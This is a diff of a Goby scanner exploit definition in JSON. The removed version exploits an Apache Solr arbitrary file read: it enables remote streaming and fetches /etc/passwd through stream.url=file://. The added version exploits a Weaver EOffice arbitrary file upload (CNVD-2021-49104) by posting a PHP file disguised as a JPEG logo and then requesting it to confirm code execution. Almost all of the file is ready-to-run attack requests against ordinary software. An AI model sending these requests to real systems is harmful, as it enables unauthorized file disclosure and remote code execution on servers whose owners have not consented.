@@ -1,40 +1,38 @@
 {
-      "Name": "Apache Solr Arbitrary File Read",
-      "Level": "2",
-      "Tags": ["fileread"],
-      "GobyQuery": "app=\"Solr\"",
-      "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
-      "Product": "Apache Solr",
-      "Homepage": "https://solr.apache.org/",
-      "Author": "PeiQi",
-      "Impact": "<p>Read any file on the server</p>",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
+      "Name": "泛微 EOffice Arbitrary File Upload CNVD-2021-49104",
+      "Level": "3",
+      "Tags": [
+            "getshell"
       ],
-	  "HasExp": true,
-	  "ExpParams": [
-		{
-			"name": "file",
-			"type": "createSelect",
-			"value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
-			"show": ""
-			}
-	  ],
-	  "ExpTips": {
-		"Type": "",
-		"Content": ""
-	  },
+      "GobyQuery": "(app=\"泛微-EOffice\" | app=\"EOffice\")",
+      "Description": "泛微 EOffice 存在任意文件上传",
+      "Product": "https://www.weaver.com.cn/",
+      "Homepage": "https://gobies.org/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://mp.weixin.qq.com/s?__biz=MzIxNTIzNTExMQ==&mid=2247486095&idx=1&sn=950550f05795d6ae64842a2f3a5b0eca"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-                        "follow_redirect": true,
-                        "header": {},
+                        "method": "POST",
+                        "uri": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "--e64bdf16c554bbc109cecef6451c26a4\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\nContent-Type: image/jpeg\n\n<?php\nprint \"test\";\n?>\n\n--e64bdf16c554bbc109cecef6451c26a4--",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -51,24 +49,63 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "responseHeader",
+                                    "value": "logo-eoffice.php",
                                     "bz": ""
                               }
                         ]
                   },
-                  "SetVariable": []
+                  "SetVariable": [
+                        "output|define||访问"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/images/logo/logo-eoffice.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
             }
       ],
-	  "ExploitSteps": [
+      "ExploitSteps": [
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+                        "method": "POST",
+                        "uri": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "--e64bdf16c554bbc109cecef6451c26a4\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test1.php\"\nContent-Type: image/jpeg\n\n<?php\nphpinfo();\n?>\n\n--e64bdf16c554bbc109cecef6451c26a4--",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -85,71 +122,16 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "responseHeader",
+                                    "value": "logo-eoffice.php",
                                     "bz": ""
                               }
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
-                  ]
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "set_variable":["solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","],
-                        "uri": "/solr/{{{solrCore}}}/config",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/json"
-                        },
-                        "data_type": "text",
-                        "data": "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": []
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "uri": "/solr/{{{solrCore}}}/debug/dump?param=ContentStreams",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        "data_type": "text",
-                        "data": "stream.url=file://{{{file}}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                  "output|lastbody|regex|(?s)\"stream\":\"(.*)\"}]"
+                        "output|define||/images/logo/logo-eoffice.php"
                   ]
             }
       ],
-      "PostTime": "2021-03-27 17:17:15",
-      "GobyVersion": "1.8.254"
+      "PostTime": "2021-11-29 10:13:59",
+      "GobyVersion": "1.9.310"
 }
